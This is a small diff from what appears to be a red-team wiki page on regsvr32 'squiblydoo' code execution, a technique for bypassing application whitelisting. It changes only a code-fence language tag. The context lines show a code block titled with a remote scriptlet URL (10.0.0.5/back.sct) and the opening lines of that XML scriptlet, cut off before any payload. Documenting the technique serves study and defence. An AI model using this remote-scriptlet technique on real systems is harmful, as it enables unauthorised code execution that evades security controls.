@@ -7,7 +7,7 @@ description: regsvr32 (squiblydoo) code execution - bypass application whitelist
 ### Execution
 
 {% code title="<http://10.0.0.5/back.sct>" %}
-```markup
+```xml
 <?XML version="1.0"?>
 <scriptlet>
 <registration
